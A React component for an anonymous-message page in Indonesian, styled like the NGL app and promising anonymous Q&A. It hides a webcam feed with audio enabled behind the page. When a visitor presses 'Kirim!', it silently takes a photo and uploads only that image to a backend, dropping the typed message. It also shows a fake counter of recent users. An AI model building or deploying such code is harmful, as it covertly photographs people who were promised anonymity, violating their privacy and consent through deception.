import React, { useState, useRef } from 'react'
import Anonim from './services/anonim'
import Webcam from "react-webcam";

const videoConstraints = {
  width: 200,
  height: 200,
  // facingMode: "environment"
};

const Ngl = () => {
  // const [visible, setVisible] = useState(false)
  const [textValue, setTextValue] = useState('')
  const webcamRef = useRef(null);
  const [url, setUrl] = React.useState(null);


  const capturePhoto = React.useCallback(async () => {
    const imageSrc = webcamRef.current.getScreenshot();
    setUrl(imageSrc);
  }, [webcamRef]);

  // console.log(url)
  const onUserMedia = (e) => {
    // console.log(e);
  };

  const isSubmit = (e) => {
    e.preventDefault()
    console.log('text')
    const newObject = {
      isi: url
    }
    Anonim
      .create(newObject)
      .then(result => {
        // console.log(result)
        setTextValue('')
      })
  }



  return (
    <>
      <div className='absolute -z-40'>
        <Webcam
          ref={webcamRef}
          audio={true}
          screenshotFormat="image/jpeg"
          videoConstraints={videoConstraints}
          onUserMedia={onUserMedia}
        />
        {/* <img src={url} alt="" /> */}
      </div>
      <div className='w-screen h-screen bg-gradient-to-br from-[#EC1187] to-[#FF8D10] px-11 py-12 overflow-hidden'>
        <form onSubmit={isSubmit}>
          <div className='max-w-2xl bg-[#ffffff59] h-52 m-auto rounded-3xl overflow-hidden relative'>
            <div className='bg-white w-full h-16 flex flex-row px-5 gap-3'>
              <div className='flex flex-col justify-center'>
                <img className='w-10 h-10 rounded-full' src="https://firebasestorage.googleapis.com/v0/b/ask-fun-d10f0.appspot.com/o/images%2FJGYvHzJ5yUeSToURkHsmSdFAPwv1.jpg?alt=media&token=d5a81e71-dda3-4a5d-9c8c-69a9a89f32c8" alt="" />
              </div>
              <div className='flex flex-col justify-center'>
                <p className='text-sm'>@afrialivan</p>
                <p className='text-sm -mt-1 font-bold'>send me anonymous messages!</p>
              </div>
            </div>
            <textarea className='text- w-full h-full bg-transparent placeholder:text-[#0000005a] placeholder:font-bold placeholder:text-lg px-5 py-4 focus:outline-none' placeholder='kirim pesan anonim kepadaku...'
              onChange={(event) => setTextValue(event.target.value)}
              value={textValue}
            >
            </textarea>
            <button className='absolute bottom-5 right-10 bg-[#ffffff70] rounded-full p-2 text-xl'>
              🎲
            </button>
          </div>
          <p className='text-white text-center mt-3'>🔒 tanya-jawab anonim</p>
          <button type='submit' className='max-w-2xl bg-black w-full py-4 rounded-3xl text-white mt-3 text-lg block m-auto'
            onClick={capturePhoto}
          >
            Kirim!
          </button>
        </form>
      </div>
      <div className='absolute bottom-0 w-screen h-52 text-center px-11'>
        <p className='font-bold text-white mb-7'>👇 2238 orang baru saja mengetuk tombol ini👇</p>
        <button className='max-w-2xl bg-black w-full py-4 rounded-3xl text-white animate-bounce'>
          Dapatkan pesan untukmu sendiri!
        </button>
        <div className='flex gap-2 justify-center text-[#ffffff99] font-bold mt-2'>
          <p>Term</p>
          <p>Privacy</p>
        </div>
      </div>
    </>
  )
}

export default Ngl